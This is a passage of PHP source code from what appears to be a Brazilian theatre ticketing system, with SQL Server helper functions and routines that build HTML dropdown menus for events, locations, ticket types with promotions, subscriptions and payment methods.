function getProximoValorAssinatura($id_assinatura_cliente) {
    $mainConnection = mainConnection();

    $query = "WITH RESULTADO AS (
                    SELECT AC.ID_CLIENTE, AC.ID_ASSINATURA_CLIENTE, AV.QT_MES_VIGENCIA, AV.VL_ASSINATURA, COUNT(AH.ID_ASSINATURA_CLIENTE) AS QT_PAGAMENTOS
                    FROM MW_ASSINATURA_VALOR AV
                    INNER JOIN MW_ASSINATURA_CLIENTE AC ON AC.ID_ASSINATURA = AV.ID_ASSINATURA
                    INNER JOIN MW_ASSINATURA_HISTORICO AH ON AH.ID_ASSINATURA_CLIENTE = AC.ID_ASSINATURA_CLIENTE
                    WHERE AC.ID_ASSINATURA_CLIENTE = ?
                    GROUP BY AC.ID_CLIENTE, AC.ID_ASSINATURA_CLIENTE, AV.QT_MES_VIGENCIA, AV.VL_ASSINATURA
                )
                SELECT TOP 1 VL_ASSINATURA
                FROM RESULTADO
                WHERE
                    (QT_MES_VIGENCIA >= QT_PAGAMENTOS
                        AND ID_ASSINATURA_CLIENTE IN (SELECT MIN(ID_ASSINATURA_CLIENTE)
                                                        FROM MW_ASSINATURA_CLIENTE
                                                        WHERE ID_CLIENTE = RESULTADO.ID_CLIENTE))
                    OR
                    (QT_MES_VIGENCIA IN (SELECT MAX(QT_MES_VIGENCIA) FROM RESULTADO))
                ORDER BY QT_MES_VIGENCIA";
    $params = array($id_assinatura_cliente);
    $rs = executeSQL($mainConnection, $query, $params, true);

    return $rs['VL_ASSINATURA'];
}





/*  BANCO  */



require_once('../settings/mainConnections.php');

function sqlErrors($index = NULL) {
    $retorno = sqlsrv_errors();

    return (($index == NULL) ? $retorno : $retorno[0][$index]);
}

function beginTransaction($conn) {
    return null;//sqlsrv_begin_transaction($conn);
}

function commitTransaction($conn) {
    return null;//sqlsrv_commit($conn);
}

function rollbackTransaction($conn) {
    return null;//sqlsrv_rollback($conn);
}

function executeSQL($conn, $strSql, $params = array(), $returnRs = false) {
    ini_set('mssql.charset', 'UTF-8');
    if (empty($params)) {
    $result = sqlsrv_query($conn, $strSql);
    } else {
    $result = sqlsrv_query($conn, $strSql, $params);
    }

    if ($returnRs) {
    return fetchResult($result);
    } else {
    return $result;
    }
}

function getLastID($resource){
    sqlsrv_next_result($resource);
    sqlsrv_fetch($resource);
    return sqlsrv_get_field($resource, 0);
}

function fetchAssoc($result){
    $res = array();
    while($rs = sqlsrv_fetch_array($result, SQLSRV_FETCH_ASSOC))
    {
        array_push($res, $rs);
    }

    return $res;
}

function fetchResult($result, $fetchType = SQLSRV_FETCH_BOTH) {
    return sqlsrv_fetch_array($result, $fetchType);
}

function numRows($conn, $strSql, $params = array()) {
    if (empty($params)) {
    $result = sqlsrv_query($conn, $strSql, $params, array("Scrollable" => SQLSRV_CURSOR_KEYSET));
    } else {
    $result = sqlsrv_query($conn, $strSql, $params, array("Scrollable" => SQLSRV_CURSOR_KEYSET));
    }
    return sqlsrv_num_rows($result);
}

function hasRows($result, $returnNum = false) {
    if ($returnNum) {
    return sqlsrv_num_rows($result);
    } else {
    return sqlsrv_has_rows($result);
    }
}

/*  COMBOS  */

function comboRegiaoGeografica($name) {
    $mainConnection = mainConnection();
    $result = executeSQL($mainConnection, 'SELECT ID_REGIAO_GEOGRAFICA, DS_REGIAO_GEOGRAFICA FROM MW_REGIAO_GEOGRAFICA');

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione uma regi&atilde;o...</option>';
    while ($rs = fetchResult($result)) {
    $combo .= '<option value="' . $rs['ID_REGIAO_GEOGRAFICA'] . '">' . utf8_encode2($rs['DS_REGIAO_GEOGRAFICA']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}



function comboEvento($name, $teatro, $selected, $paramns = array())
{
    if ( isset($paramns['emcartaz']) )
    {
        $queryCartaz = "SELECT 
                        DISTINCT(A.ID_EVENTO) 
                        --, MAX(A.dt_apresentacao) AS DT_APRESENTACAO
                        , B.DS_EVENTO
                        FROM mw_apresentacao AS A 
                        INNER JOIN mw_evento AS B ON A.id_evento = B.id_evento
                        WHERE B.id_base = ? AND A.in_ativo = '1'
                        GROUP BY A.id_evento, B.ds_evento
                        HAVING CONVERT(DATE, MAX(A.dt_apresentacao), 103) >= CONVERT(DATE, GETDATE(), 103)
                        ORDER BY B.ds_evento";
    }
    else
    {
        $queryCartaz = "SELECT ID_EVENTO, DS_EVENTO FROM MW_EVENTO WHERE ID_BASE = ? AND IN_ATIVO = '1' ORDER BY DS_EVENTO";
    }

    $mainConnection = mainConnection();
    $result = executeSQL($mainConnection, $queryCartaz, array($teatro));

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um evento...</option>';
    while ($rs = fetchResult($result)) {
    $combo .= '<option value="' . $rs['ID_EVENTO'] . '"' .
        (($selected == $rs['ID_EVENTO']) ? ' selected' : '') .
        '>' . str_replace("'", "\'", utf8_encode2($rs['DS_EVENTO'])) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboEventoPermissao($name, $params, $selected) {
    $mainConnection = mainConnection();
    $result = executeSQL($mainConnection, 'SELECT E.ID_EVENTO, E.DS_EVENTO
                                            FROM MW_EVENTO E
                                            INNER JOIN MW_ACESSO_CONCEDIDO AC ON AC.ID_USUARIO = ? AND AC.ID_BASE = E.ID_BASE AND AC.CODPECA = E.CODPECA
                                            WHERE E.ID_BASE = ? AND E.IN_ATIVO = \'1\'', $params);
    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um evento...</option>';

    while ($rs = fetchResult($result)) {
    $combo .= '<option value="' . $rs['ID_EVENTO'] . '"' .
        (($selected == $rs['ID_EVENTO']) ? ' selected' : '') .
        '>' . utf8_encode2($rs['DS_EVENTO']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboEstado($name, $selected, $extenso = false, $isCombo = true, $extraProp = '', $shortText = false) {
    $mainConnection = mainConnection();
    $query = 'SELECT ID_ESTADO, ' . (($extenso) ? 'DS_ESTADO' : 'SG_ESTADO') . ' FROM MW_ESTADO';
    $result = executeSQL($mainConnection, $query);

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '" ' . $extraProp . '><option value="">'.($shortText ? 'UF' : 'Selecione um estado...').'</option>';
    while ($rs = fetchResult($result)) {
    if (($selected == $rs['ID_ESTADO'])) {
        $isSelected = 'selected';
        $text = '<span name="' . $name . '" class="inputStyle">' . utf8_encode2($rs[(($extenso) ? 'DS_ESTADO' : 'SG_ESTADO')]) . '</span>';
    } else {
        $isSelected = '';
    }
    $combo .= '<option value="' . $rs['ID_ESTADO'] . '"' . $isSelected . '>' . utf8_encode2($rs[(($extenso) ? 'DS_ESTADO' : 'SG_ESTADO')]) . '</option>';
    }
    $combo .= '</select>';

    return $isCombo ? $combo : $text;
}

function comboAtivo($name, $selected, $isCombo = true) {

    $combo = '<option value="">Selecione um Status...</option>';
    $combo .= '<option value="0">Não</option>';
    $combo .= '<option value="1">Sim</option>';
  
    $text = '<span name="' . $name . '" class="inputStyle">'. ($selected==0 ? 'Não':'Sim') . '</span>';
 

    return $isCombo ? $combo : $text;
}


function comboAtivoOptions($name,$selected,$in_ativo,$isCombo = true) {

    $isSelected = '';
     $combo = '<option value="">Selecione um Status...</option>';
    if ($selected == 0 ) {
        $isSelected = 'selected';
        $text = '<span name="' . $name . '" class="inputStyle">Não</span>';
    } 
    $combo .= '<option value="0" ' . $isSelected . '>Não</option>';

    if ($selected==1) {
        $isSelected = 'selected';
        $text = '<span name="' . $name . '" class="inputStyle">Sim</span>';
    }
    $combo .= '<option value="1" ' . $isSelected . '>Sim</option>';
    $combo .= '</select>';

    if (sqlErrors ())
    return print_r(sqlErrors()) . print_r($params);
    else
    return $isCombo ? $combo : $text;


}


function comboEstadoOptions($name, $selected, $extenso = false, $isCombo = true) {
    $mainConnection = mainConnection();
    $query = 'SELECT ID_ESTADO, ' . (($extenso) ? 'DS_ESTADO' : 'SG_ESTADO') . ' FROM MW_ESTADO ORDER BY DS_ESTADO';
    $result = executeSQL($mainConnection, $query);

    $combo = '<option value="">Selecione um estado...</option>';
    while ($rs = fetchResult($result)) {
    if (($selected == $rs['ID_ESTADO'])) {
        $isSelected = 'selected';
        $text = '<span name="' . $name . '" class="inputStyle">' . utf8_encode2($rs[(($extenso) ? 'DS_ESTADO' : 'SG_ESTADO')]) . '</span>';
    } else {
        $isSelected = '';
    }
    $combo .= '<option value="' . $rs['ID_ESTADO'] . '"' . $isSelected . '>' . utf8_encode2($rs[(($extenso) ? 'DS_ESTADO' : 'SG_ESTADO')]) . '</option>';
    }
    if (sqlErrors ())
    return print_r(sqlErrors());
    else
    return $isCombo ? $combo : $text;
}

function comboMunicipio($name, $selected, $idEstado, $isCombo = true) {
    $mainConnection = mainConnection();
    $query = 'SELECT ID_MUNICIPIO,DS_MUNICIPIO FROM MW_MUNICIPIO WHERE ID_ESTADO = ? ORDER BY DS_MUNICIPIO';
    $params = array($idEstado);
    $result = executeSQL($mainConnection, $query, $params);

    $combo = '<option value="">Selecione um município...</option>';
    while ($rs = fetchResult($result)) {
    if (($selected == $rs['ID_MUNICIPIO'])) {
        $isSelected = 'selected';
        $text = '<span name="' . $name . '" class="inputStyle">' . utf8_encode2($rs["DS_MUNICIPIO"]) . '</span>';
    } else {
        $isSelected = '';
    }
    $combo .= '<option value="' . $rs['ID_MUNICIPIO'] . '"' . $isSelected . '>' . utf8_encode2($rs["DS_MUNICIPIO"]) . '</option>';
    }
    if (sqlErrors ())
    return print_r(sqlErrors()) . print_r($params);
    else
    return $isCombo ? $combo : $text;
}

function comboTipoLocal($name, $selected, $isCombo = true) {
    $mainConnection = mainConnection();
    $query = 'SELECT ID_TIPO_LOCAL, DS_TIPO_LOCAL FROM MW_TIPO_LOCAL';
    $result = executeSQL($mainConnection, $query);

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um tipo...</option>';
    while ($rs = fetchResult($result)) {
    if (($selected == $rs['ID_TIPO_LOCAL'])) {
        $isSelected = 'selected';
        $text = '<span name="' . $name . '" class="inputStyle">' . utf8_encode2($rs["DS_TIPO_LOCAL"]) . '</span>';
    } else {
        $isSelected = '';
    }
    $combo .= '<option value="' . $rs['ID_TIPO_LOCAL'] . '"' . $isSelected . '>' . utf8_encode2($rs["DS_TIPO_LOCAL"]) . '</option>';
    }
    $combo .= '</select>';

    return $isCombo ? $combo : $text;
}

function comboTipoLocalOptions($name, $selected, $isCombo = true) {
    $mainConnection = mainConnection();
    $query = 'SELECT ID_TIPO_LOCAL, DS_TIPO_LOCAL FROM MW_TIPO_LOCAL';
    $result = executeSQL($mainConnection, $query);

    $combo = '<option value="">Selecione um tipo...</option>';
    while ($rs = fetchResult($result)) {
    if (($selected == $rs['ID_TIPO_LOCAL'])) {
        $isSelected = 'selected';
        $text = '<span name="' . $name . '" class="inputStyle">' . utf8_encode2($rs["DS_TIPO_LOCAL"]) . '</span>';
    } else {
        $isSelected = '';
    }
    $combo .= '<option value="' . $rs['ID_TIPO_LOCAL'] . '"' . $isSelected . '>' . utf8_encode2($rs["DS_TIPO_LOCAL"]) . '</option>';
    }

    return $isCombo ? $combo : $text;
}

function comboPrecosIngresso($name, $apresentacaoID, $idCadeira, $selected = NULL, $isCombo = true, $isArray = false) {
    session_start();
    $mainConnection = mainConnection();

    $query = 'SELECT B.ID_BASE, E.ID_EVENTO
                 FROM
                 MW_BASE B
                 INNER JOIN MW_EVENTO E ON E.ID_BASE = B.ID_BASE
                 INNER JOIN MW_APRESENTACAO A ON A.ID_EVENTO = E.ID_EVENTO
                 WHERE A.ID_APRESENTACAO = ?';
    $params = array($apresentacaoID);
    $rs = executeSQL($mainConnection, $query, $params, true);

    $id_base = $rs['ID_BASE'];
    $conn = getConnection($rs['ID_BASE']);
    $id_evento = $rs['ID_EVENTO'];

    $query = "SELECT COUNT(1) AS MEIA_ESTUDANTE
                FROM TABTIPBILHETE B
                INNER JOIN CI_MIDDLEWAY..MW_APRESENTACAO_BILHETE AB ON AB.CODTIPBILHETE = B.CODTIPBILHETE
                INNER JOIN CI_MIDDLEWAY..MW_RESERVA R ON AB.ID_APRESENTACAO = R.ID_APRESENTACAO
                AND AB.ID_APRESENTACAO_BILHETE = R.ID_APRESENTACAO_BILHETE
                WHERE B.STATIPBILHMEIAESTUDANTE = 'S' AND B.STATIPBILHETE = 'A'
                AND R.ID_SESSION = ?";
    $rs2 = executeSQL($conn, $query, array(session_id()), true);

    $ocultarMeiaEstudante = (getTotalMeiaEntradaDisponivel($apresentacaoID) <= 0 and $rs2['MEIA_ESTUDANTE'] == 0) ? "AND (B.STATIPBILHMEIAESTUDANTE <> 'S' OR B.STATIPBILHMEIAESTUDANTE IS NULL) " : '';

    $query = "SELECT B.CODTIPBILHETE
                FROM TABTIPBILHETE B
                INNER JOIN CI_MIDDLEWAY..MW_APRESENTACAO_BILHETE AB ON AB.CODTIPBILHETE = B.CODTIPBILHETE
                INNER JOIN CI_MIDDLEWAY..MW_RESERVA R ON AB.ID_APRESENTACAO = R.ID_APRESENTACAO
                AND AB.ID_APRESENTACAO_BILHETE = R.ID_APRESENTACAO_BILHETE
                WHERE B.STATIPBILHMEIAESTUDANTE = 'N' AND B.STATIPBILHETE = 'A' AND B.QTDVENDAPORLOTE > 0
                AND R.ID_SESSION = ?";
    $result = executeSQL($conn, $query, array(session_id()));

    $bilhetes_lote_no_carrinho = array();
    while ($rs = fetchResult($result)) {
        $bilhetes_lote_no_carrinho[] = $rs['CODTIPBILHETE'];
    }

    $ocultarLote = (getTotalLoteDisponivel($apresentacaoID) <= 0 and $rs2['LOTE'] == 0) ? true : false;

    $query = "SELECT    ID_APRESENTACAO_BILHETE,
                        AB.CODTIPBILHETE,
                        AB.DS_TIPO_BILHETE,
                        VL_LIQUIDO_INGRESSO,
                        PC.CODTIPPROMOCAO,
                        ISNULL(CE.QT_PROMO_POR_CPF, ISNULL(PC.QT_PROMO_POR_CPF, 0)) AS QT_PROMO_POR_CPF,
                        B.STATIPBILHMEIAESTUDANTE,
                        B.QTDVENDAPORLOTE,
                        B.IMG1PROMOCAO,
                        B.IMG2PROMOCAO,
                        A.ID_EVENTO,
                        B.ID_PROMOCAO_CONTROLE,
                        B.IN_HOT_SITE,
                        PC.IN_EXIBICAO
                FROM
                 CI_MIDDLEWAY..MW_APRESENTACAO_BILHETE AB 
                 INNER JOIN 
                 CI_MIDDLEWAY..MW_APRESENTACAO   A
                 ON A.ID_APRESENTACAO = AB.ID_APRESENTACAO
                 INNER JOIN 
                 CI_MIDDLEWAY..MW_EVENTO   E
                 ON E.ID_EVENTO = A.ID_EVENTO
                 INNER JOIN
                 TABTIPBILHETE B
                 ON  B.CODTIPBILHETE = AB.CODTIPBILHETE
                 AND B.IN_VENDA_SITE = 1
                 AND 0 = CASE DATEPART(W, A.DT_APRESENTACAO)
                            WHEN 1 THEN IN_DOM 
                            WHEN 2 THEN IN_SEG 
                            WHEN 3 THEN IN_TER 
                            WHEN 4 THEN IN_QUA 
                            WHEN 5 THEN IN_QUI 
                            WHEN 6 THEN IN_SEX 
                            ELSE IN_SAB
                            END
                LEFT JOIN CI_MIDDLEWAY..MW_PROMOCAO_CONTROLE PC
                 ON PC.ID_PROMOCAO_CONTROLE = B.ID_PROMOCAO_CONTROLE
                LEFT JOIN CI_MIDDLEWAY..MW_CONTROLE_EVENTO CE
                 ON CE.ID_PROMOCAO_CONTROLE = PC.ID_PROMOCAO_CONTROLE
                 AND CE.ID_EVENTO = E.ID_EVENTO
                WHERE AB.ID_APRESENTACAO = ? 
                AND AB.IN_ATIVO = '1'
                AND NOT EXISTS (SELECT 1 FROM 
                        TABAPRESENTACAO AP
                        INNER JOIN
                        TABRESTRICAOBILHETE R
                        ON AP.CODPECA = R.CODPECA
                        AND AP.CODSALA = R.CODSALA
                        AND R.CODSETOR IS NULL
                     WHERE AB.CODTIPBILHETE = R.CODTIPBILHETE
                       AND AP.CODAPRESENTACAO = A.CODAPRESENTACAO)
                AND NOT EXISTS (SELECT 1 FROM 
                        TABAPRESENTACAO AP
                        INNER JOIN
                        TABRESTRICAOBILHETE R
                        ON AP.CODPECA = R.CODPECA
                        AND AP.CODSALA = R.CODSALA
                        INNER JOIN
                        TABSALDETALHE D
                        ON D.CODSALA = AP.CODSALA
                        AND D.INDICE  = ?
                        AND D.CODSETOR = R.CODSETOR
                WHERE AB.CODTIPBILHETE = R.CODTIPBILHETE
                   AND AP.CODAPRESENTACAO = A.CODAPRESENTACAO)
                    $ocultarMeiaEstudante
                ORDER BY (CASE WHEN B.VL_PRECO_FIXO = 0 THEN 50000 ELSE B.VL_PRECO_FIXO END), B.PERDESCONTO, AB.DS_TIPO_BILHETE
                ";
//                ORDER BY (CASE WHEN B.VL_PRECO_FIXO IS NULL THEN 0 ELSE B.VL_PRECO_FIXO END), AB.DS_TIPO_BILHETE
    $result = executeSQL($conn, $query, array($apresentacaoID, $idCadeira));

    $combo = '<select name="' . $name . '" class="' . $name . ' inputStyle">';
    $first_selected = false;

    $bilhetes = array();

    while ($rs = fetchResult($result)) {

        if (
            (in_array($id_evento, explode(',', $_COOKIE['hotsite'])) and $rs['IN_HOT_SITE'] == '1')
            or
            (!in_array($id_evento, explode(',', $_COOKIE['hotsite'])) and $rs['IN_HOT_SITE'] != '1')
            ) {
            // bilhetes que passarem na validacao serao exibidos
        } else {
            // ignorar bilhetes que sejam de hotsite durante o acesso normal
            // ignorar bilhetes normais em eventos acessados via hotsite
            continue;
        }

        $is_lote = $rs['QTDVENDAPORLOTE'] > 0 and $rs['STATIPBILHMEIAESTUDANTE'] == 'N';
        $is_lote_disponivel = getTotalLoteDisponivel($rs['ID_APRESENTACAO_BILHETE']) > 0;
        $is_lote_no_carrinho = in_array($rs['CODTIPBILHETE'], $bilhetes_lote_no_carrinho);

        // ignorar lote se nao estiver disponivel, desde que o cliente nao tenha o bilhete no carrinho
        if (!$is_lote
            or ($is_lote and $is_lote_disponivel)
            or ($is_lote and $is_lote_no_carrinho)) {
            
            // se for bin itau
            if (in_array($rs['CODTIPPROMOCAO'], array(4, 7))) {
                $rs['IMG1PROMOCAO'] = '../images/promocional/' . basename($rs['IMG1PROMOCAO']);
                $rs['IMG2PROMOCAO'] = '../images/promocional/' . basename($rs['IMG2PROMOCAO']);

                $BIN = 'qtBin="' . $rs['QT_PROMO_POR_CPF'] . '" codeBin="' . $rs['ID_PROMOCAO_CONTROLE'] .
                        '" img1="' . $rs['IMG1PROMOCAO'] . '" img2="' . $rs['IMG2PROMOCAO'] . '" sizeBin="6"';
                $promocao = '';

                $bilhetes[$rs['ID_APRESENTACAO_BILHETE']]['qtBin'] = $rs['QT_PROMO_POR_CPF'];
                $bilhetes[$rs['ID_APRESENTACAO_BILHETE']]['codeBin'] = $rs['ID_PROMOCAO_CONTROLE'];
                $bilhetes[$rs['ID_APRESENTACAO_BILHETE']]['img1'] = $rs['IMG1PROMOCAO'];
                $bilhetes[$rs['ID_APRESENTACAO_BILHETE']]['img2'] = $rs['IMG2PROMOCAO'];

            // outras promocoes
            } elseif ($rs['CODTIPPROMOCAO'] != NULL) {

                if ($rs['IMG1PROMOCAO'] === '') {
                    $imgs = 'img1="" img2="" ';
                } else {
                    $imgs = 'img1="' . '../images/promocional/' . basename($rs['IMG1PROMOCAO']) .
                            '" img2="' . '../images/promocional/' . basename($rs['IMG2PROMOCAO']) . '" ';
                }

                // se for promocao convite
                if ($rs['CODTIPPROMOCAO'] == 5) {
                    $rs_cod_convite = executeSQL($mainConnection,
                        'SELECT TOP 1 P.CD_PROMOCIONAL, P.ID_PEDIDO_VENDA, P.ID_SESSION
                         FROM MW_PROMOCAO P
                         WHERE P.ID_PROMOCAO_CONTROLE = ?
                         ORDER BY P.ID_PEDIDO_VENDA, P.ID_SESSION, P.CD_PROMOCIONAL DESC', array($rs['ID_PROMOCAO_CONTROLE']), true);

                    // se nao tiver mais cupons ignorar esse tipo de bilhete
                    if ((!empty($rs_cod_convite['ID_SESSION']) or !empty($rs_cod_convite['ID_PEDIDO_VENDA'])) and $rs['ID_APRESENTACAO_BILHETE'] != $selected) {
                        continue;
                    }

                    if ($rs_cod_convite['CD_PROMOCIONAL'] == 'CONVITE') {
                        $imgs .= 'codigo="CONVITE" ';
                        $bilhetes[$rs['ID_APRESENTACAO_BILHETE']]['codPreValidado'] = 'CONVITE';
                    }

                // se for promocao assinatura
                } elseif ($rs['CODTIPPROMOCAO'] == 8) {
                    $rs_assinatura = executeSQL($mainConnection,
                        'SELECT TOP 1 P.CD_PROMOCIONAL, P.ID_PEDIDO_VENDA, P.ID_SESSION, C.CD_CPF
                         FROM MW_PROMOCAO P
                         INNER JOIN MW_ASSINATURA_PROMOCAO AP ON AP.ID_PROMOCAO_CONTROLE = P.ID_PROMOCAO_CONTROLE
                         INNER JOIN MW_ASSINATURA_CLIENTE AC ON AC.ID_ASSINATURA = AP.ID_ASSINATURA
                         INNER JOIN MW_CLIENTE C ON C.ID_CLIENTE = AC.ID_CLIENTE
                         WHERE P.ID_PROMOCAO_CONTROLE = ? AND C.ID_CLIENTE = ?
                         AND (AC.IN_ATIVO = 1 OR (AC.IN_ATIVO = 0 AND AC.DT_PROXIMO_PAGAMENTO >= CAST(GETDATE() AS DATE)))
                         ORDER BY P.ID_PEDIDO_VENDA, P.ID_SESSION, P.CD_PROMOCIONAL DESC', array($rs['ID_PROMOCAO_CONTROLE'], $_SESSION['user']), true);

                    // se nao tiver mais cupons ignorar esse tipo de bilhete
                    if (empty($rs_assinatura)
                        OR
                        ((!empty($rs_assinatura['ID_SESSION']) OR !empty($rs_assinatura['ID_PEDIDO_VENDA']))
                            AND $rs['ID_APRESENTACAO_BILHETE'] != $selected)) {
                        continue;
                    }

                    $imgs .= 'codigo="'.$rs_assinatura['CD_CPF'].'" ';
                    $bilhetes[$rs['ID_APRESENTACAO_BILHETE']]['codPreValidado'] = $rs_assinatura['CD_CPF'];

                // se for beneficio para assinante
                } elseif ($rs['CODTIPPROMOCAO'] == 9) {
                    $rs_assinatura = executeSQL($mainConnection,
                        "SELECT TOP 1 C.CD_CPF
                         FROM MW_ASSINATURA_PROMOCAO AP
                         INNER JOIN MW_ASSINATURA_CLIENTE AC ON AC.ID_ASSINATURA = AP.ID_ASSINATURA
                         INNER JOIN MW_CLIENTE C ON C.ID_CLIENTE = AC.ID_CLIENTE
                         WHERE C.ID_CLIENTE = ?
                         AND (AC.IN_ATIVO = 1 OR (AC.IN_ATIVO = 0 AND AC.DT_PROXIMO_PAGAMENTO >= CAST(GETDATE() AS DATE)))", array($_SESSION['user']), true);

                    // se nao tiver assinatura para o beneficio ignorar esse tipo de bilhete
                    if (empty($rs_assinatura)) {
                        continue;
                    }

                    $imgs .= 'codigo="'.$rs_assinatura['CD_CPF'].'" ';
                    $bilhetes[$rs['ID_APRESENTACAO_BILHETE']]['codPreValidado'] = $rs_assinatura['CD_CPF'];
                }

                $BIN = '';
                $promocao = 'qtPromocao="' . $rs['QT_PROMO_POR_CPF'] . '" codPromocao="'.$rs['ID_PROMOCAO_CONTROLE'] . '" sizeBin="32" ' . $imgs;

                $bilhetes[$rs['ID_APRESENTACAO_BILHETE']]['qtPromocao'] = $rs['QT_PROMO_POR_CPF'];
                $bilhetes[$rs['ID_APRESENTACAO_BILHETE']]['codPromocao'] = $rs['ID_PROMOCAO_CONTROLE'];
                $bilhetes[$rs['ID_APRESENTACAO_BILHETE']]['img1'] = '../images/promocional/' . basename($rs['IMG1PROMOCAO']);
                $bilhetes[$rs['ID_APRESENTACAO_BILHETE']]['img2'] = '../images/promocional/' . basename($rs['IMG2PROMOCAO']);

            // nem bin itau e nem codigo promocional
            } else {
                $BIN = $promocao = '';
            }

            $meia_estudante = $rs['STATIPBILHMEIAESTUDANTE'] == 'S' ? ' meia_estudante="1"' : '';
            $bilhetes[$rs['ID_APRESENTACAO_BILHETE']]['meia_estudante'] = ($rs['STATIPBILHMEIAESTUDANTE'] == 'S');

            $lote = ($rs['QTDVENDAPORLOTE'] > 0 and $rs['STATIPBILHMEIAESTUDANTE'] == 'N') ? ' lote="1"' : '';
            $bilhetes[$rs['ID_APRESENTACAO_BILHETE']]['lote'] = ($rs['QTDVENDAPORLOTE'] > 0 and $rs['STATIPBILHMEIAESTUDANTE'] == 'N');

            $tipoPromo = ' tipoPromo="'.$rs['CODTIPPROMOCAO'].'"';

            if (($selected == $rs['ID_APRESENTACAO_BILHETE'])) {
                $isSelected = 'selected';
                $text = '<input type="hidden" name="' . $name . '" value="' . $rs['ID_APRESENTACAO_BILHETE'] . '" ' . $BIN . $promocao . $tipoPromo .
                        ' valor="'.number_format($rs['VL_LIQUIDO_INGRESSO'], 2, ',', '').'"><span class="' . $name . ' inputStyle">' . utf8_encode2($rs['DS_TIPO_BILHETE']) . '</span>';
            } else {
                $isSelected = '';
            }

            // seleciona o primeira ingresso nao promocional desde que o usuario nao tenha selecionado nada ainda
            if (empty($selected) and $BIN == $promocao and !$first_selected) {
                $isSelected = 'selected';
                $first_selected = true;
            }

            // checar exibicao da promocao
            if ($rs['IN_EXIBICAO'] == null or $rs['IN_EXIBICAO'] == 'T' or $rs['IN_EXIBICAO'] == 'W') {
                $combo .= '<option value="' . $rs['ID_APRESENTACAO_BILHETE'] . '" ' . $isSelected . ' ' . $BIN . $promocao . $meia_estudante . $lote . $tipoPromo .
                          ' valor="'.number_format($rs['VL_LIQUIDO_INGRESSO'], 2, ',', '').'">' . utf8_encode2($rs['DS_TIPO_BILHETE']) . '</option>';
            }

            $bilhetes[$rs['ID_APRESENTACAO_BILHETE']]['descricao'] = utf8_encode2($rs['DS_TIPO_BILHETE']);
            $bilhetes[$rs['ID_APRESENTACAO_BILHETE']]['valor'] = $rs['VL_LIQUIDO_INGRESSO'];
            $bilhetes[$rs['ID_APRESENTACAO_BILHETE']]['exibicao'] = $rs['IN_EXIBICAO'];
            $bilhetes[$rs['ID_APRESENTACAO_BILHETE']]['codTipPromocao'] = $rs['CODTIPPROMOCAO'];
        }
    }
    $combo .= '</select>';

    return $isCombo ? $combo : ($isArray ? $bilhetes : $text);
}
// ----------------------------
function comboTeatro($name, $selected, $funcJavascript = "") {
    $mainConnection = mainConnection();
    $result = executeSQL($mainConnection, 'SELECT ID_BASE, DS_NOME_TEATRO FROM MW_BASE WHERE IN_ATIVO = \'1\' ORDER BY DS_NOME_TEATRO');

    $combo = '<select name="' . $name . '" ' . $funcJavascript . ' class="inputStyle" id="' . $name . '"><option value="">Selecione um local...</option>';
    while ($rs = fetchResult($result)) {
    $combo .= '<option value="' . $rs['ID_BASE'] . '"' . (($selected == $rs['ID_BASE']) ? ' selected' : '') . '>' . utf8_encode2($rs['DS_NOME_TEATRO']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboSala($name, $teatroID) {
    $conn = getConnection($teatroID);
    $result = executeSQL($conn, 'SELECT CODSALA, NOMSALA, INGRESSONUMERADO FROM TABSALA WHERE STASALA = \'A\' ORDER BY NOMSALA');

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione uma sala...</option>';
    while ($rs = fetchResult($result)) {
    $combo .= '<option value="' . $rs['CODSALA'] . '" numerado="'.$rs['INGRESSONUMERADO'].'">' . utf8_encode2($rs['NOMSALA']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboMeioPagamento($name, $selected = '-1', $isCombo = true) {
    $mainConnection = mainConnection();
    $query = 'SELECT ID_MEIO_PAGAMENTO, DS_MEIO_PAGAMENTO FROM MW_MEIO_PAGAMENTO ORDER BY DS_MEIO_PAGAMENTO ASC';
    $result = executeSQL($mainConnection, $query);

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um meio...</option>';
    while ($rs = fetchResult($result)) {
    if ($selected == $rs['ID_MEIO_PAGAMENTO']) {
        $isSelected = 'selected';
        $text = utf8_encode2($rs['DS_MEIO_PAGAMENTO']);
    } else {
        $isSelected = '';
    }
    $combo .= '<option value="' . $rs['ID_MEIO_PAGAMENTO'] . '"' . $isSelected . '>' . utf8_encode2($rs['DS_MEIO_PAGAMENTO']) . '</option>';
    }
    $combo .= '</select>';

    return $isCombo ? $combo : $text;
}

function comboFormaPagamento($name, $teatroID, $selected = '-1', $isCombo = true) {
    $conn = getConnection($teatroID);
    $query = 'SELECT CODFORPAGTO, FORPAGTO FROM TABFORPAGAMENTO WHERE STAFORPAGTO = \'A\'';
    $result = executeSQL($conn, $query);

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione uma forma...</option>';
    while ($rs = fetchResult($result)) {
    if ($selected == $rs['CODFORPAGTO']) {
        $isSelected = 'selected';
        $text = utf8_encode2($rs['FORPAGTO']);
    } else {
        $isSelected = '';
    }
    $combo .= '<option value="' . $rs['CODFORPAGTO'] . '"' . $isSelected . '>' . utf8_encode2($rs['FORPAGTO']) . '</option>';
    }
    $combo .= '</select>';

    return $isCombo ? $combo : $text;
}

function comboBilhetes2($name, $teatroID, $selected = '-1', $isCombo = true) {
    $conn = getConnection($teatroID);
    $query = 'SELECT CODTIPBILHETE, DS_NOME_SITE FROM TABTIPBILHETE WHERE STATIPBILHETE = \'A\' AND IN_VENDA_SITE = 1 ORDER BY 2';
    $result = executeSQL($conn, $query);

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um bilhete...</option>';
    while ($rs = fetchResult($result)) {
    if ($selected == $rs['CODTIPBILHETE']) {
        $isSelected = 'selected';
        $text = utf8_encode2($rs['DS_NOME_SITE']);
    } else {
        $isSelected = '';
    }
